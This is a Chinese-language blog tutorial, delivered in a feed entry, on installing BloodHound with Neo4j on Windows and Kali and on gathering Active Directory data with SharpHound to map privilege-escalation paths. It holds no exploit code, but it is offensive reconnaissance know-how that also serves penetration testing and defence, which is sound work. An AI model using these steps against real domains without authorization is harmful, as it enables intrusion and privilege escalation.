    <content type="html"><![CDATA[<h1 id="0x01-BloodHound简介"><a href="#0x01-BloodHound简介" class="headerlink" title="0x01 BloodHound简介"></a>0x01 BloodHound简介</h1><blockquote><p>BloodHound 是一个免费的工具。BloodHound 以用图与线的形式将域内用户、计算机、组、会话、ACL 及域内所有相关用户、组、计算机、登录信息、访问控制策略之间的关系直观地展现 在 Red Team 成员面前，更便捷地分析域内情况，更快地在域内提升权限。BloodHound 也可以使Blue Team 成员对己方网络系统进行更好的安全检测，以及保证域的安全性。BloodHound 使用图形理论，自动化地在 Active Directory 环境中理清大部分人员之间的关系和细节。使用 BloodHound，可以快速地深入了解 AD 中的一些用户关系、哪些用户具有管理员权限、哪些用户有权对任何计算机都拥有管理权限，以及有效的用户组成员信息。</p><p>BloodHound 通过在域内导出相关信息，在将数据采集后，将其导入本地安装好的 Neo4j 数据库中，展示和分析域内所需相关信息。Neo4j 是一款 NoSQL 图形数据库，它将结构化数据存储在网络上而不是表中。Bloodhound 正是利用这种特性加以合理分析，更加直观地以节点空间的形式来表达相关数据。Neo4j就像MySQL或其他数据库一样，有自己的查询语言Cypher Query Language。因为 Neo4j 是一款非关系型数据库，要想用它查询数据，同样需要自己独特的语法。</p></blockquote><h1 id="0x02-BloodHound-安装"><a href="#0x02-BloodHound-安装" class="headerlink" title="0x02 BloodHound 安装"></a>0x02 BloodHound 安装</h1><h2 id="windows安装"><a href="#windows安装" class="headerlink" title="windows安装"></a>windows安装</h2><blockquote><p>参考：《内网安全攻防-渗透测试实战指南》</p></blockquote><p>首先，准备一台安装有 Windows Server 操作系统的机器。为了方便、快捷地使用 Neo4j 的 Web管理界面，推荐安装 Chrome 或火狐浏览器。</p><p>Neo4j 数据库需要 Java 环境才能运行。从 Oracle 官方网站下载 JDK Windows x64 安装包并安装，如图 2-86 所示。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20201021083717373.png" alt="image-20201021083717373"></p><p>在 Neo4j 官方网站的社区服务版模块中选择“Windows”选项，并下载最新的 Neo4j 数据库</p><p>安装包（写作本书时的最新版为 3.5.1），如图 2-87 所示。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20201021083759178.png" alt="image-20201021083759178"></p><p>下载完成并解压，打开 cmd 窗口，进入解压后的 bin 目录。在 cmd 下输入命令“neo4j.bat console”，启动 Neo4j 服务</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210314192242503.png" alt="image-20210314192242503"></p><p>看到服务成功启动的提示后，打开浏览器，输入地址“<a href="http://127.0.0.1:7474/browser/%E2%80%9D%E3%80%82%E6%89%93%E5%BC%80%E9%A1%B5">http://127.0.0.1:7474/browser/”。打开页</a> 面后，输入账号和密码</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20201021083826943.png" alt="image-20201021083826943"></p><p>Neo4j 默认的配置信息如下。 </p><ul><li>Host：<a href="http://127.0.0.1:7474。">http://127.0.0.1:7474。</a> </li><li>User：neo4j。 </li><li>Password：neo4j</li></ul><p>输入完成后，提示修改密码。在这里，为了方便演示，将密码修改为“123456”。在 GitHub 的 BloodHound 项目中提供了其 Release 版本，下载地址为 <a href="https://github.com/BloodHoundAD/BloodHound/releases/download/2.0.4/BloodHound-win32-x64.zip%E3%80%82%E8%AF%BB%E8%80%85%E4%B9%9F%E5%8F%AF%E4%BB%A5%E9%80%89%E6%8B%A9%E4%B8%8B%E8%BD%BD%E6%BA%90%E4%BB%A3%E7%A0%81%E8%87%AA%E5%B7%B1%E6%9E%84%E5%BB%BA%E3%80%82%E5%9C%A8%E8%BF%99%E9%87%8C%EF%BC%8C%E9%80%89%E6%8B%A9%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD">https://github.com/BloodHoundAD/BloodHound/releases/download/2.0.4/BloodHound-win32-x64.zip。读者也可以选择下载源代码自己构建。在这里，选择直接下载</a> Release 版本，</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20201021083912433.png" alt="image-20201021083912433"></p><p>下载完成后进行解压，进入目录，找到 BloodHound.exe，双击运行</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20201021083920276.png" alt="image-20201021083920276"></p><ul><li>Database URL：bolt://localhost:7687。</li><li>DB Username：neo4j。</li><li>DB Password：123456</li></ul><p>输入以上信息后，单击“Login”按钮，进入 BloodHound 主界面，如图 2-92 所示。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20201021084133494.png" alt="image-20201021084133494"></p><p>现在，Bloodhound 已经安装成功了。</p><h2 id="kali-linux安装"><a href="#kali-linux安装" class="headerlink" title="kali linux安装"></a>kali linux安装</h2><blockquote><p>参考：<a href="https://blog.csdn.net/Alexhcf/article/details/113030110">BloodHound工具安装、启动</a></p></blockquote><p><code>sudo apt-get install bloodhound </code></p><p>安装完成后，先启动neo4j</p><p><code>sudo neo4j console </code></p><p>启动成功后访问<a href="http://localhost:7474/browser/">http://localhost:7474/browser/</a></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20210123100540637.png" alt="在这里插入图片描述"></p><p>User默认 neo4j</p><p>Password默认 neo4j<br>其他不用改</p><p>连接成功后就会提示创建新密码</p><p>接下来在终端输入bloodhound<br>会启动bloodhound的图形化页面，然后输入neo4j的账号密码即可</p><h1 id="0x03-BloodHound基本使用"><a href="#0x03-BloodHound基本使用" class="headerlink" title="0x03 BloodHound基本使用"></a>0x03 BloodHound基本使用</h1><p>BloodHound 所需要的三条信息严重依赖于 PowerView.ps1 脚本的 BloodHound。BloodHound分为两个版本，一个是 PowerShell 采集器脚本SharpHound.ps1、另一个是 exe 可执行文件 SharpHound.exe</p><p>地址为：</p><div class="hljs code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/BloodHoundAD/</span>BloodHound<span class="hljs-regexp">/blob/m</span>aster<span class="hljs-regexp">/Collectors/</span>SharpHound.exehttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/BloodHoundAD/</span>BloodHound<span class="hljs-regexp">/blob/m</span>aster<span class="hljs-regexp">/Collectors/</span>SharpHound.ps1</code></pre></div><p>最新版本SharpHound.exe 需要.net framework 4才可以正常运行，如在是在win server2008中的报错结果。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210314195450174.png" alt="image-20210314195450174"></p><p>在win server 2012中正常运行</p><p>可以得到一个zip文件，将此文件拖出，然后直接拖入BloodHound界面。</p><p>点击旁边的预置脚本即可看到图形化结果。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210314200854763.png" alt="image-20210314200854763"></p><blockquote><p>老版本的SharpHound可以在.net低版本中运行，但是产生结果正常导入新版本的BloodHound。如果遇到.net的问题，可以安装低版本的BloodHound进行分析。</p></blockquote><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://blog.csdn.net/Alexhcf/article/details/113030110">BloodHound工具安装、启动</a></li><li>《内网安全攻防-渗透测试实战指南》</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-BloodHound简介&quot;&gt;&lt;a href=&quot;#0x01-BloodHound简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 BloodHound简介&quot;&gt;&lt;/a&gt;0x01 BloodHound简介&lt;/h1&gt;&lt;blockquote&gt;
</summary>
      
    
    
    
    <category term="安全工具" scheme="https://greydr34d.github.io/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    <category term="内网渗透" scheme="https://greydr34d.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="BloodHound" scheme="https://greydr34d.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/BloodHound/"/>
    
    <category term="BloodHound" scheme="https://greydr34d.github.io/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/BloodHound/"/>
    
    
    <category term="安全工具" scheme="https://greydr34d.github.io/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    <category term="BloodHound" scheme="https://greydr34d.github.io/tags/BloodHound/"/>
    
    <category term="内网渗透" scheme="https://greydr34d.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
